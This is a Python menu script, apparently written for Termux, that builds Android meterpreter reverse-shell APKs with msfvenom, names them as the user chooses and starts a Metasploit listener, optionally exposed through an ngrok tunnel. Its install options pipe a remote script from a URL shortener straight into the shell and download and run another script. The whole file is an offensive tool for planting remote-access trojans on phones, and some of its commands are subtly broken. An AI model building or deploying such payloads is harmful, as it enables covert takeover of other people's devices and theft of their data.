import os
import time
import sys
W='\33[0m'
R='\33[1;31m'
G='\33[1;32m'
O='\33[1;33m'
B='\33[1;34m'
P='\33[1;35m'
C='\33[1;36m'
GR='\33[1;37m'
X="\033[1;30m"
def xx(s):
	for i in s:
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(0.10)
def pp(s):
	for i in s:
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(0.)
def pw():
	print(f"{W}[{R}*{W}] open ngrok >{G} ./ngrok tcp 4444{W}")
	try:
		host = input(f"{W}[{R}*{W}] Set HOST: ")
		port = input(f"{W}[{R}*{W}] Set PORT: ")
		name = input(f"{W}[{R}*{W}] Set NAME: ")
	except:
		print(R+"ERROR")
	pp(f"[{G}*{W}] Loding ");time.sleep(0.2);xx(".....\n"+W)
	os.system(f"msfvenom -p android/meterpreter/reverse LHOST={host} LPORT={port} R > /sdcard/{name}.apk")
	pp(f"[{G}*{W}] meterprter ");time.sleep(0.2);xx(".....\n"+W)
	os.system('msfconsole -x "use exploit/multi/handler;set Payload android/meterpreter/reverse;set LHOST localhost;set LPORT 4444;clear;exploit"')

def ip():
	try:
		host1 = input(f"{W}[{R}*{W}] Set HOST: ")
		port1 = input(f"{W}[{R}*{W}] Set PORT: ")
		name1 = input(f"{W}[{R}*{W}] Set NAME: ")
	except:
		print(R+"ERROR")
	pp(f"[{G}*{W}] Loding ");time.sleep(0.2);xx(".....\n"+W)
	os.system(f"msfvenom -p android/meterpreter/reverse LHOST={host1} LPORT={port1} R > /sdcard/{name1}.apk")
	pp(f"[{G}*{W}] meterprter ");time.sleep(0.2);xx(".....\n"+W)
	os.system('msfconsole -x "use exploit/multi/handler;set Payload android/meterpreter/reverse;set LHOST {host1};set LPORT {port1};clear;exploit"')

def met():
	pp(f"[{G}*{W}] Loding ");time.sleep(0.2);xx(".....\n"+W)
	os.system("cd $HOME")
	os.system("pkg install wget curl openssh git -y")
	os.system("apt install ncurses-utils")
	os.system("source <(curl -fsSL https://kutt.it/msf)")
	os.system("pkg install wget")
	os.system("wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh")
	os.system("chmod +x metasploit.sh")
	os.system("./metasploit.sh")

def ngrok():
	pp(f"[{G}*{W}] Loding ");time.sleep(0.2);xx(".....\n"+W)
	os.system("cd $HOME&&git clone https://github.com/issamiso/ngroktcp")
	os.system("cd ngroktcp;mv ngrok $HOME;chmod +x ngrok")
	try:
		tok=input(f"{W}[{R}*{W}] Enter token > ")
	except:
		print(R+"ERROR")
	os.system(f"./{tok}")
print(f"""{G}
	     __I__    
{O} —————————————{R}[{G}|{R}]{O}—————————————
{O}|{B} P   A   Y   {R}[{B}L{R}]{B}  O   A   D{O}  |
 —————————————{R}[{G}|{R}]{O}—————————————
	      {R}[{G}|{R}] {X}github:{X} github.com/issamiso
	       {P}V{W}  {X}telegram:{X} i_4iS_exe{R}
{W}[{R}1{W}] Payload 
[{R}2{W}] Install metasploit
[{R}3{W}] Install ngrok """)  
try:    
	kay=input(f"[{R}-{W}] Enter Namber > ")
except:
	print(R+"ERRRO")
if kay =="1":
	print(G+"————————————————————————")
	print(f"""{W}[{R}1{W}] payload ngrok 
{W}[{R}2{W}] payload IP""")
	try:
		nn=input(f"{W}[{R}*{W}] Namber > ")
	except:
		print(R+"ERROR")
	if nn == "1":
		print(G+"————————————————————————")
		pw()
	if nn =="2":
		print(G+"————————————————————————")
		ip()
if kay == "2":
	print(G+"————————————————————————")
	met()
if kay == "3":
	ngrok()
